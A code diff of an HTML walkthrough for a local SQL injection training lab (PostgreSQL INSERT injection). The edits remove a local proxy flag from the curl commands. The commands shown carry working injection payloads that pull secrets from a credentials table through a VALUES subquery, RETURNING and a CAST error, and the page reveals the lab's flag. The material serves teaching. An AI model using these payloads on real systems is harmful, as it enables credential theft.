@@ -11,7 +11,7 @@
         <span class="terminal-title">Step 1. Baseline Test</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab15" \<br> --data-urlencode "username=testuser" --data-urlencode "bio=Hello world"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab15" \<br> --data-urlencode "username=testuser" --data-urlencode "bio=Hello world"<br><br>
         <span class="prompt">Username: </span>testuser<br>
         <span class="prompt">Bio: </span>Hello world<br>
         <span class="prompt">Response: </span><strong>Profile created!</strong> id: 18
@@ -50,7 +50,7 @@
         <span class="terminal-title">Step 3. Injection Confirmation</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab15" \<br> --data-urlencode "username=user1" \<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab15" \<br> --data-urlencode "username=user1" \<br>
         &nbsp;&nbsp;--data-urlencode "bio=test'), ('injected', 'second row') -- -"<br><br>
         <span class="prompt">Username: </span>user1<br>
         <span class="prompt">Bio: </span>test'), ('injected', 'second row') -- -<br>
@@ -73,7 +73,7 @@
         <span class="terminal-title">Step 4. Subquery in VALUES</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab15" \<br> --data-urlencode "username=user2" \<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab15" \<br> --data-urlencode "username=user2" \<br>
         &nbsp;&nbsp;--data-urlencode "bio=test'), ((SELECT secret FROM credentials WHERE service='internal_api'), 'leaked') -- -"<br><br>
         <span class="prompt">Username: </span>user2<br>
         <span class="prompt">Bio: </span>test'), ((SELECT secret FROM credentials WHERE service='internal_api'), 'leaked') -- -<br>
@@ -97,7 +97,7 @@
         <span class="terminal-title">Step 5. RETURNING Manipulation</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab15" \<br> --data-urlencode "username=user3" \<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab15" \<br> --data-urlencode "username=user3" \<br>
         &nbsp;&nbsp;--data-urlencode "bio=test') RETURNING (SELECT secret FROM credentials WHERE service='internal_api')::text -- -"<br><br>
         <span class="prompt">Username: </span>user3<br>
         <span class="prompt">Bio: </span>test') RETURNING (SELECT secret FROM credentials WHERE service='internal_api')::text -- -<br>
@@ -120,7 +120,7 @@
         <span class="terminal-title">Step 6. CAST Error in INSERT</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab15" \<br> --data-urlencode "username=user4" \<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab15" \<br> --data-urlencode "username=user4" \<br>
         &nbsp;&nbsp;--data-urlencode "bio='||(SELECT CAST(secret AS INTEGER) FROM credentials WHERE service='internal_api')||'"<br><br>
         <span class="prompt">Username: </span>user4<br>
         <span class="prompt">Bio: </span>'||(SELECT CAST(secret AS INTEGER) FROM credentials WHERE service='internal_api')||'<br>
@@ -142,7 +142,7 @@
         <span class="terminal-title">curl. Full Exploit (CAST Error)</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab15" \<br> --data-urlencode "username=test" \<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab15" \<br> --data-urlencode "username=test" \<br>
         &nbsp;&nbsp;--data-urlencode "bio=' || (SELECT CAST(secret AS INTEGER) FROM credentials WHERE service='internal_api') || '"<br><br>
         <span class="prompt">Response: </span><strong>Query Error:</strong> ERROR:  invalid input syntax for type integer: "FLAG{pg_1ns3rt_r3turn1ng}"
     </div>
